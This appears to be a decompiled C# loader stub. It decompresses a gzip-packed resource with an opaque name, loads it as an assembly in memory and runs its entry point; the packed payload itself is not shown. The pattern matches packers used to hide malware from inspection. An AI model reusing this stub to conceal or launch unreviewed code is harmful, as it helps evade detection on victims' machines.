using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

namespace Prog;

internal class Program
{
	private static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("cKNwq8", Assembly.GetExecutingAssembly());
		byte[] gzip = (byte[])resourceManager.GetObject("cKNwq8");
		Assembly assembly = Assembly.Load(Decompress(gzip));
		if ((object)assembly.EntryPoint != null)
		{
			MethodInfo entryPoint = assembly.EntryPoint;
			object obj = assembly.CreateInstance(entryPoint.Name);
			entryPoint.Invoke(obj, null);
		}
	}

	private static byte[] Decompress(byte[] gzip)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress);
		byte[] buffer = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		do
		{
			num = gZipStream.Read(buffer, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(buffer, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}
}
